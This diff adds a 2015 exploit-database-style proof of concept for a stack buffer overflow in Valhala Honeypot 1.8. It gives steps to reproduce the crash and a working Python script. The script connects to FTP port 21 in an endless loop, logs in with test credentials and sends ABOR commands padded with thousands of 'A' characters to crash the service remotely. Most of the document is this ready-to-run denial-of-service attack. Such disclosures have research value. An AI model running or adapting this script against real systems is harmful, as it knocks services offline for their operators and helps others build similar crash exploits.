@@ -1,0 +1,41 @@
+"""
+********************************************************************************************
+# Exploit Title: Valhala Honeypot Stack based BOF(Remote DOS)
+# Date: 8/20/2015
+# Exploit Author: Un_N0n
+# Software Developer: Marcos Flavio Araujo Assuncao
+# Software Link: http://sourceforge.net/projects/valhalahoneypot/
+# Version: 1.8
+# Tested on: Windows 7 x86(32 BIT)
+********************************************************************************************
+
+[Steps to Produce the Crash]:
+1- Open 'honeypot.exe'.
+2- Enter the IP of the machine on which this honeypot is running, in this case it is your own
+   machine i.e 127.0.0.1.
+3- Run the script.
+~ Software crashes. 
+
+
+[Code to crash honeypot]: 
+==============================================================
+"""
+import socket
+
+while True:
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("IP_ADDR",21))
+    s.send('USER test\r\n')
+    s.send('PASS test\r\n')
+    s.send('ABOR '+'A'*2000+'\r\n')
+    s.recv(1024)
+    s.send('ABOR '+'A'*5000+'\r\n')
+    s.recv(1024)
+    s.send('ABOR '+'A'*6000+'\r\n')
+    s.recv(1024)
+    s.send('QUIT\r\n')
+    s.close()
+
+==============================================================
+
+**********************************************************************************************
